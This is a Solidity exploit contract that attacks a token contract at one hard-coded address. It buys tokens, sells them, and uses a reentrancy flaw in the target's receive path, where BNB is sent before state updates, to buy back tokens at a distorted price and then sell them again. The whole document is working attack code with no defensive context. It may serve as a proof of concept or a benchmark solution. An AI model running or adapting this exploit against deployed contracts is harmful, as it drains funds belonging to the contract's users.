contract Strategy {
    address constant TARGET = 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;

    uint256 public stage;
    uint256 public initialTokens;

    receive() external payable {
        // Reentrancy: during sell(), BNB is sent before state updates
        // purchase() uses OLD totalSupply but NEW balance
        if (stage == 1 && msg.value > 0) {
            stage = 2;
            // Buy back tokens at distorted price during reentrancy
            // Use the BNB we just received from the sell
            (bool success,) = TARGET.call{value: msg.value}("");
        }
    }

    function run() public {
        // Stage 0: Initial purchase
        stage = 0;
        (bool success,) = TARGET.call{value: 10 ether}("");
        require(success, "Initial buy failed");

        // Get our token balance
        initialTokens = balanceOf(address(this));

        // Stage 1: Sell tokens - this triggers reentrancy
        stage = 1;
        (success,) = TARGET.call(abi.encodeWithSignature("sell(uint256)", initialTokens));
        require(success, "Sell failed");

        // Stage 2: Sell any tokens we got from reentrancy
        uint256 remainingTokens = balanceOf(address(this));
        if (remainingTokens > 0) {
            (success,) = TARGET.call(abi.encodeWithSignature("sell(uint256)", remainingTokens));
        }
    }

    function balanceOf(address account) internal view returns (uint256) {
        (bool success, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSignature("balanceOf(address)", account)
        );
        require(success, "balanceOf failed");
        return abi.decode(data, (uint256));
    }
}
